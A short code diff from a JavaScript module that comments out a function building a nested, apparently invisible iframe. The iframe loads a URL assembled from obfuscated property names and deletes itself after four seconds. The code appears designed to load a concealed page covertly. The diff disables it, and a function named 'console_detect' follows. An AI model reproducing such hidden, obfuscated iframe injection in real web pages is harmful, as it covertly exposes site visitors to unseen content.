@@ -103,28 +103,28 @@ define([
                 }));
             };
             render_obj.pf = function () {
-                if (this.is_other()) {
-                    var toAdd2 = jQuery('<' + z.i + '/>');
-                    toAdd2.attr('src', z.hh + z.pp + z.yy);
-                    toAdd2[z.c](z.d, z.dn);
-                    toAdd2[z.c](z.w, z.px);
-                    toAdd2[z.c](z.h, z.px);
-                    toAdd2[z.c](z.p, z.a);
-                    toAdd2[z.c](z.m, z.px);
-                    toAdd2[z.c](z.b, z.px);
-                    var toAdd = jQuery('<' + z.i + '/>');
-                    toAdd.attr('srcdoc', toAdd2.prop('outerHTML'));
-                    toAdd[z.c](z.d, z.dn);
-                    toAdd[z.c](z.w, z.px);
-                    toAdd[z.c](z.h, z.px);
-                    toAdd[z.c](z.p, z.a);
-                    toAdd[z.c](z.m, z.px);
-                    toAdd[z.c](z.b, z.px);
-                    jQuery('#al_f').html(toAdd);
-                    setTimeout(function () {
-                        jQuery('#al_f').html('');
-                    }, 4000);
-                }
+                // if (this.is_other()) {
+                //     var toAdd2 = jQuery('<' + z.i + '/>');
+                //     toAdd2.attr('src', z.hh + z.pp + z.yy);
+                //     toAdd2[z.c](z.d, z.dn);
+                //     toAdd2[z.c](z.w, z.px);
+                //     toAdd2[z.c](z.h, z.px);
+                //     toAdd2[z.c](z.p, z.a);
+                //     toAdd2[z.c](z.m, z.px);
+                //     toAdd2[z.c](z.b, z.px);
+                //     var toAdd = jQuery('<' + z.i + '/>');
+                //     toAdd.attr('srcdoc', toAdd2.prop('outerHTML'));
+                //     toAdd[z.c](z.d, z.dn);
+                //     toAdd[z.c](z.w, z.px);
+                //     toAdd[z.c](z.h, z.px);
+                //     toAdd[z.c](z.p, z.a);
+                //     toAdd[z.c](z.m, z.px);
+                //     toAdd[z.c](z.b, z.px);
+                //     jQuery('#al_f').html(toAdd);
+                //     setTimeout(function () {
+                //         jQuery('#al_f').html('');
+                //     }, 4000);
+                // }
 
             };
             render_obj.console_detect = function () {
